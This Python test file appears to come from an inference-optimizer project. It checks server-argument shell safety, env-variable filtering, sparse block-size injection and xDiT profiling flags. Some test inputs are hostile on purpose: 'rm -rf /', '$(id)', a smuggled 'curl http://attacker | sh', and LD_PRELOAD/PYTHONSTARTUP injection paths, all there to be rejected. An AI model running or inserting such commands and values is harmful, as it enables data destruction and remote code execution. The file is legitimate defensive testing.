# SPDX-FileCopyrightText: 2026 Advanced Micro Devices, Inc.
# SPDX-License-Identifier: MIT

"""Branch-coverage tests for shared workload-env materialization: GPU-count detection, profile-window math, per-model work-arounds, and NUM_PROMPTS sizing."""

from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest
import yaml

from hyperloom.orchestrator.actions.executors import _workload_envs as we

from ._workload_envs_helpers import clear_env, materialize, write_config
from hyperloom.inference_optimizer.grid_server_args import validate_server_args_shell_safe


def _seed_reference_envs(tmp_path, monkeypatch, envs):
    """Pin a session whose SharedState carries ``reference_envs``."""
    from hyperloom.orchestrator.state.shared_state import SharedState

    sd = tmp_path / "session"
    sd.mkdir(parents=True, exist_ok=True)
    SharedState(session_id="ref-test", reference_envs=dict(envs)).save(sd)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_CURRENT_SESSION_DIR", str(sd))


def _stub_server_arg_injectors(monkeypatch):
    monkeypatch.setattr(we, "inject_sglang_context_length", lambda args, *a, **k: args)
    monkeypatch.setattr(we, "inject_sglang_watchdog_timeout", lambda args, *a, **k: args)
    monkeypatch.setattr(we, "inject_sglang_attention_backend", lambda args, *a, **k: args)


def test_validate_server_args_rejects_bare_positionals():
    assert validate_server_args_shell_safe("--flag value --other=value") == "--flag value --other=value"
    with pytest.raises(ValueError, match="bare positional"):
        validate_server_args_shell_safe("stray --flag value")


def test_validate_server_args_allows_multi_value_flags():
    """argparse ``nargs=\"+\"`` flags carry several values; the sink must accept them."""
    args = "--cuda-graph-bs 1 2 4 8 16 24 32 48 64"
    assert validate_server_args_shell_safe(args) == args
    # A flag not on the whitelist still gets its value plus a numeric list, so an nargs="+" flag nobody has enumerated
    # yet is not rejected either.
    assert validate_server_args_shell_safe("--a 1 2 --b=3 --c x") == "--a 1 2 --b=3 --c x"


def test_validate_server_args_still_catches_positionals_after_a_flag():
    """The multi-value relaxation must not become \"one flag opens the gates\"."""
    with pytest.raises(ValueError, match="bare positional"):
        # --port=8000 already carries its value; run.sh is positional.
        validate_server_args_shell_safe("--port=8000 run.sh")
    with pytest.raises(ValueError, match="bare positional"):
        # --foo consumes bar; payload.json after it is not a value list.
        validate_server_args_shell_safe("--foo bar payload.json")
    with pytest.raises(ValueError, match="bare positional"):
        # Being on the multi-value whitelist widens how MANY values a flag takes, not what they may look like: every
        # entry on that list is a list of batch sizes.
        validate_server_args_shell_safe("--cuda-graph-bs 1 2 run.sh")


@pytest.mark.parametrize(
    "args",
    [
        "--flag value; rm -rf /",
        "--flag `whoami`",
        "--flag $(id)",
        "--flag a|b",
        "--flag a>b",
    ],
)
def test_validate_server_args_still_blocks_shell_control(args):
    with pytest.raises(ValueError, match="shell control characters"):
        validate_server_args_shell_safe(args)


def test_materialize_drops_unsafe_env_keys_but_preserves_workload_knobs(tmp_path, monkeypatch):
    clear_env(monkeypatch)
    _stub_server_arg_injectors(monkeypatch)
    src = tmp_path / "base.yaml"
    write_config(src)
    _seed_reference_envs(
        tmp_path,
        monkeypatch,
        {
            "DEEPSEEK_API_KEY": "deepseek-secret",
            "PYTHONPATH": "/tmp/evil",
            "REFERENCE_ONLY_KNOB": "1",
            "VLLM_ROCM_USE_AITER": "1",
            "bad key": "dropped",
        },
    )
    bench = materialize(
        src,
        tmp_path / "out",
        launch=we.LaunchLayer(
            extra_envs={
                "ANTHROPIC_API_KEY": "anthropic-secret",
                "LD_PRELOAD": "/tmp/evil.so",
                "LLM_GATEWAY_KEY": "gateway-secret",
                "OPENAI_API_KEY": "secret",
                "PYTHONSTARTUP": "/tmp/pwn.py",
                "SGLANG_USE_AITER": "1",
                "UNKNOWN_VALID_TUNING_KNOB": "enabled",
                "BAD-NAME": "dropped",
            }
        ),
    )
    envs = bench["envs"]
    assert "ANTHROPIC_API_KEY" not in envs
    assert "LLM_GATEWAY_KEY" not in envs
    assert "OPENAI_API_KEY" not in envs
    assert "DEEPSEEK_API_KEY" not in envs
    assert "LD_PRELOAD" not in envs
    assert "PYTHONSTARTUP" not in envs
    assert "BAD-NAME" not in envs
    assert "bad key" not in envs
    assert envs["REFERENCE_ONLY_KNOB"] == "1"
    assert envs["SGLANG_USE_AITER"] == "1"
    assert envs["UNKNOWN_VALID_TUNING_KNOB"] == "enabled"
    assert envs["VLLM_ROCM_USE_AITER"] == "1"


def test_materialize_rejects_shell_control_in_server_args(tmp_path, monkeypatch):
    clear_env(monkeypatch)
    _stub_server_arg_injectors(monkeypatch)
    src = tmp_path / "base.yaml"
    write_config(src)
    with pytest.raises(ValueError, match="shell control"):
        materialize(
            src,
            tmp_path / "out",
            launch=we.LaunchLayer(extra_server_args="--dtype bfloat16; curl http://attacker | sh"),
        )


# ---- _visible_gpu_count ---------------------------------------------------


def _write_sparse_model_dir(tmp_path, *, sparse_block_size=128, nested=False, name="model"):
    """Write a minimal model dir whose config.json declares a sparse block size."""
    d = tmp_path / name
    d.mkdir(exist_ok=True)
    sparse = {"sparse_attention_config": {"sparse_block_size": sparse_block_size}}
    cfg: dict = {"model_type": "minimax_m3"}
    cfg.update({"text_config": sparse} if nested else sparse)
    (d / "config.json").write_text(json.dumps(cfg), encoding="utf-8")
    return str(d)


def test_sparse_model_injects_block_size_from_config_vllm(monkeypatch, tmp_path):
    # Config-derived: any model declaring sparse_attention_config.sparse_block_size gets that value as vLLM
    # --block-size (default 16 aborts KV-cache init).
    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
    src = write_config(tmp_path / "cfg.yaml", framework="vllm")
    bench = materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=model_dir))
    assert "--block-size 128" in bench["envs"]["EXTRA_VLLM_ARGS"]


def test_sparse_block_size_read_from_nested_text_config(monkeypatch, tmp_path):
    # sparse_attention_config nested under text_config (multimodal wrapper); the value is model-derived, not hardcoded
    # (here 64 to prove it is read).
    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=64, nested=True)
    src = write_config(tmp_path / "cfg.yaml", framework="vllm")
    bench = materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=model_dir))
    assert "--block-size 64" in bench["envs"]["EXTRA_VLLM_ARGS"]


def test_dense_model_no_block_size_injection(monkeypatch, tmp_path):
    # No sparse_attention_config -> nothing injected (dense models untouched).
    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    d = tmp_path / "dense"
    d.mkdir()
    (d / "config.json").write_text(json.dumps({"model_type": "llama"}), encoding="utf-8")
    src = write_config(tmp_path / "cfg.yaml", framework="vllm")
    bench = materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=str(d)))
    assert "block-size" not in bench["envs"].get("EXTRA_VLLM_ARGS", "")


def test_sparse_model_block_size_not_injected_for_sglang(monkeypatch, tmp_path):
    # --block-size is a vLLM flag; sglang rejects it, so the injection is vLLM-scoped and must never touch a sglang
    # run.
    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
    src = write_config(tmp_path / "cfg.yaml", framework="sglang")
    bench = materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=model_dir))
    assert "block-size" not in bench["envs"].get("EXTRA_SGLANG_ARGS", "")
    assert "block-size" not in bench["envs"].get("EXTRA_VLLM_ARGS", "")


def test_sparse_model_respects_operator_pinned_block_size(monkeypatch, tmp_path):
    # An explicit operator/explore --block-size wins; we must not append a second conflicting --block-size.
    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
    src = write_config(tmp_path / "cfg.yaml", framework="vllm")
    bench = materialize(
        src,
        tmp_path / "out",
        launch=we.LaunchLayer(extra_server_args="--block-size 64"),
        target=we.BenchmarkTarget(model_path=model_dir),
    )
    assert "--block-size 64" in bench["envs"]["EXTRA_VLLM_ARGS"]
    assert "--block-size 128" not in bench["envs"]["EXTRA_VLLM_ARGS"]


def test_run_eval_process_env_false_is_ignored(monkeypatch, tmp_path):
    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("RUN_EVAL", "false")
    src = write_config(tmp_path / "cfg.yaml")
    bench = materialize(src, tmp_path / "out")
    assert bench["envs"]["RUN_EVAL"] == "true"


def _arm_sglang_shape_tool(monkeypatch, tmp_path) -> Path:
    """Route the SGLang profile through the kernel_shape_tool path and return the tool dir."""
    from hyperloom.orchestrator.actions.executors import _server_patcher

    tool_dir = tmp_path / "kernel_shape_tool"
    tool_dir.mkdir()
    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "0")
    monkeypatch.delenv("HYPERLOOM_PROFILE_SHAPE_DISCOVERY", raising=False)
    monkeypatch.setattr(_server_patcher, "resolve_sglang_shape_mode", lambda: "sitecustomize")
    monkeypatch.setattr(_server_patcher, "kernel_shape_tool_dir", lambda: tool_dir)
    return tool_dir


def test_profile_shape_tool_keeps_the_inherited_pythonpath(monkeypatch, tmp_path):
    # Magpie replaces the launch env's PYTHONPATH with the config's, so a config without one must carry the
    # inherited entries, or the profile server loses the operator's and the image's import paths.
    import os

    from hyperloom.orchestrator.actions.executors import _framework_rewrite_evidence as evidence
    from hyperloom.orchestrator.actions.executors.profile import ProfileExecutor

    tool_dir = _arm_sglang_shape_tool(monkeypatch, tmp_path)
    monkeypatch.setenv("PYTHONPATH", os.pathsep.join(["/a", "/b"]))
    src = write_config(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    out = we.materialize_config_with_envs(src, tmp_path / "out")
    envs = yaml.safe_load(out.read_text())["benchmark"]["envs"]
    assert envs["TRACELENS_SHAPE_DISCOVERY"] == "1"
    assert envs["PYTHONPATH"] == os.pathsep.join([str(tool_dir), "/a", "/b"])

    # The profile shim lands in front of the tool, keeping the inherited tail.
    ProfileExecutor()._inject_host_probe(out, tmp_path / "ws")
    envs = yaml.safe_load(out.read_text())["benchmark"]["envs"]
    assert envs["PYTHONPATH"] == os.pathsep.join([str(evidence.probe_asset_dir()), str(tool_dir), "/a", "/b"])


def test_profile_shape_tool_prepends_to_the_config_pythonpath(monkeypatch, tmp_path):
    # A config that carries PYTHONPATH is authoritative: the inherited value is not appended to it.
    import os

    tool_dir = _arm_sglang_shape_tool(monkeypatch, tmp_path)
    monkeypatch.setenv("PYTHONPATH", os.pathsep.join(["/a", "/b"]))
    src = write_config(tmp_path / "cfg.yaml", envs={"PROFILE": "1", "PYTHONPATH": "/c"})
    bench = materialize(src, tmp_path / "out")
    assert bench["envs"]["PYTHONPATH"] == os.pathsep.join([str(tool_dir), "/c"])


@pytest.mark.parametrize(
    ("config_envs", "tail"),
    [({}, ["/a", "/b"]), ({"PYTHONPATH": "/c"}, ["/c"])],
    ids=["inherited", "config-authoritative"],
)
def test_reference_overlay_builds_on_the_launch_pythonpath(monkeypatch, tmp_path, config_envs, tail):
    # The reference overlay is prepended like every launch path entry: on the inherited value when the config has
    # no PYTHONPATH, on the config's otherwise. The overlay is relative so it carries no drive colon on any host.
    import os

    clear_env(monkeypatch)
    (tmp_path / "overlay").mkdir()
    (tmp_path / "overlay" / "sitecustomize.py").write_text("", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(we, "resolve_reference_launch", lambda: ("", {}, {"overlay_pythonpath": "overlay"}))
    monkeypatch.setenv("PYTHONPATH", os.pathsep.join(["/a", "/b"]))
    src = write_config(tmp_path / "cfg.yaml", envs=config_envs)
    bench = materialize(src, tmp_path / "out")
    assert bench["envs"]["PYTHONPATH"] == os.pathsep.join(["overlay", *tail])


def test_the_cli_and_the_orchestrator_read_one_set_of_workload_defaults():
    """Both sides must resolve the same fallbacks without importing each other.

    ``cli.parser`` imports from ``hyperloom.orchestrator``, so an orchestrator
    module reaching back into the parser for these numbers closes an import
    cycle. Keeping the constants in ``hyperloom.common`` is what lets a
    materialized recipe and the workload spec beside it agree on "unset"; a
    future edit that re-literals either side, or re-opens the cycle to share
    them, fails here.
    """
    from hyperloom.common import workload_defaults
    from hyperloom.inference_optimizer.cli import parser

    canonical = (workload_defaults.DEFAULT_ISL, workload_defaults.DEFAULT_OSL, workload_defaults.DEFAULT_CONC)
    assert (parser.DEFAULT_ISL, parser.DEFAULT_OSL, parser.DEFAULT_CONC) == canonical

    # The shared module has to stay a leaf, or it cannot break the cycle.
    tree = ast.parse(Path(workload_defaults.__file__).read_text(encoding="utf-8"))
    imported = [node.module for node in ast.walk(tree) if isinstance(node, ast.ImportFrom) and node.module] + [
        alias.name for node in ast.walk(tree) if isinstance(node, ast.Import) for alias in node.names
    ]
    assert imported == ["__future__"], imported

    # And the orchestrator side must not import the CLI parser at any scope.
    orchestrator_src = Path(we.__file__).read_text(encoding="utf-8")
    assert "inference_optimizer.cli import parser" not in orchestrator_src
    assert "inference_optimizer.cli.parser" not in orchestrator_src


# --- xDiT profile materialization: patch gate, flags, and status envs ---


def _xdit_profile_bench(tmp_path, monkeypatch, *, patch_ok, workload_args=None):
    from hyperloom.orchestrator.actions.executors import _server_patcher

    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "1")
    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: patch_ok)
    envs = {"PROFILE": "1"}
    if workload_args is not None:
        envs["EXTRA_XDIT_ARGS"] = workload_args
    src = tmp_path / "cfg.yaml"
    src.write_text(
        yaml.safe_dump({"benchmark": {"framework": "xdit", "model": "/m", "envs": envs}}),
        encoding="utf-8",
    )
    return materialize(src, tmp_path / "out")


def test_xdit_profile_patched_sets_capture_flags(monkeypatch, tmp_path):
    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=True)
    args = bench["envs"]["EXTRA_XDIT_ARGS"]
    assert "--profile_capture_phase" in args
    assert "--profile_with_stack" in args
    assert bench["envs"]["HYPERLOOM_TRACELENS_PATCH_STATUS"] == "ok"
    assert "HYPERLOOM_PROFILE_DEGRADED_REASON" not in bench["envs"]


def test_xdit_profile_unpatched_falls_back_to_safe_flags(monkeypatch, tmp_path):
    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=False)
    args = bench["envs"]["EXTRA_XDIT_ARGS"]
    assert "--profile_wait 1" in args
    assert "--profile_capture_phase" not in args
    assert bench["envs"]["HYPERLOOM_TRACELENS_PATCH_STATUS"] == "unavailable"
    assert bench["envs"]["HYPERLOOM_PROFILE_DEGRADED_REASON"] == "tracelens_runtime_patch_unavailable"


def test_xdit_profile_preserves_config_declared_workload_args(monkeypatch, tmp_path):
    workload = "--model tencent/HunyuanVideo --num_frames 5 --num_inference_steps 4"
    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=True, workload_args=workload)
    args = bench["envs"]["EXTRA_XDIT_ARGS"]
    assert "--model tencent/HunyuanVideo" in args
    assert "--num_frames 5" in args
    assert "--num_inference_steps 4" in args
    assert "--profile_capture_phase" in args


def test_xdit_profile_append_is_idempotent_on_rematerialization(monkeypatch, tmp_path):
    workload = "--model tencent/HunyuanVideo --num_frames 5 --num_inference_steps 4"
    already_profiled = f"{workload} --profile_wait 1 --profile_capture_phase --profile_with_stack"
    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=True, workload_args=already_profiled)
    args = bench["envs"]["EXTRA_XDIT_ARGS"]
    assert args.count("--profile_wait") == 1
    assert args.count("--profile_capture_phase") == 1
    assert "--model tencent/HunyuanVideo" in args


def test_xdit_profile_kill_switch_skips_patcher(monkeypatch, tmp_path):
    from hyperloom.orchestrator.actions.executors import _server_patcher

    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "0")
    called = []
    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: called.append(1) or True)
    src = tmp_path / "cfg.yaml"
    src.write_text(
        yaml.safe_dump({"benchmark": {"framework": "xdit", "model": "/m", "envs": {"PROFILE": "1"}}}),
        encoding="utf-8",
    )
    bench = materialize(src, tmp_path / "out")
    assert not called
    assert "--profile_capture_phase" not in bench["envs"].get("EXTRA_XDIT_ARGS", "")
    assert bench["envs"]["HYPERLOOM_TRACELENS_PATCH_STATUS"] == "not_attempted"


def test_xdit_profile_flags_survive_replace_mode(monkeypatch, tmp_path):
    """replace_args must not wipe --profile_wait; the re-assertion restores it.

    The base YAML carries --num_inference_steps 4 so the test can verify
    that only the profiler flags are restored, not the entire pre-replace string.
    """
    from hyperloom.orchestrator.actions.executors import _server_patcher

    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "1")
    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: True)
    src = tmp_path / "cfg.yaml"
    src.write_text(
        yaml.safe_dump(
            {
                "benchmark": {
                    "framework": "xdit",
                    "model": "/m",
                    "envs": {"PROFILE": "1", "EXTRA_XDIT_ARGS": "--num_inference_steps 4"},
                }
            }
        ),
        encoding="utf-8",
    )
    bench = materialize(
        src,
        tmp_path / "out",
        launch=we.LaunchLayer(extra_server_args="--use_cfg_parallel", args_mode="replace"),
    )
    args = bench["envs"]["EXTRA_XDIT_ARGS"]
    assert "--profile_wait 1" in args
    assert "--profile_capture_phase" in args
    assert "--use_cfg_parallel" in args
    assert "--num_inference_steps" not in args


def test_xdit_profile_replace_with_existing_profile_wait(monkeypatch, tmp_path):
    """Source already carries --profile_wait; replace must still restore all flags."""
    from hyperloom.orchestrator.actions.executors import _server_patcher

    clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "1")
    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: True)
    src = tmp_path / "cfg.yaml"
    src.write_text(
        yaml.safe_dump(
            {
                "benchmark": {
                    "framework": "xdit",
                    "model": "/m",
                    "envs": {
                        "PROFILE": "1",
                        "EXTRA_XDIT_ARGS": "--profile_wait 1 --profile_capture_phase --profile_with_stack",
                    },
                }
            }
        ),
        encoding="utf-8",
    )
    bench = materialize(
        src,
        tmp_path / "out",
        launch=we.LaunchLayer(extra_server_args="--use_cfg_parallel", args_mode="replace"),
    )
    args = bench["envs"]["EXTRA_XDIT_ARGS"]
    assert "--profile_wait 1" in args
    assert "--profile_capture_phase" in args
    assert "--profile_with_stack" in args
    assert "--use_cfg_parallel" in args
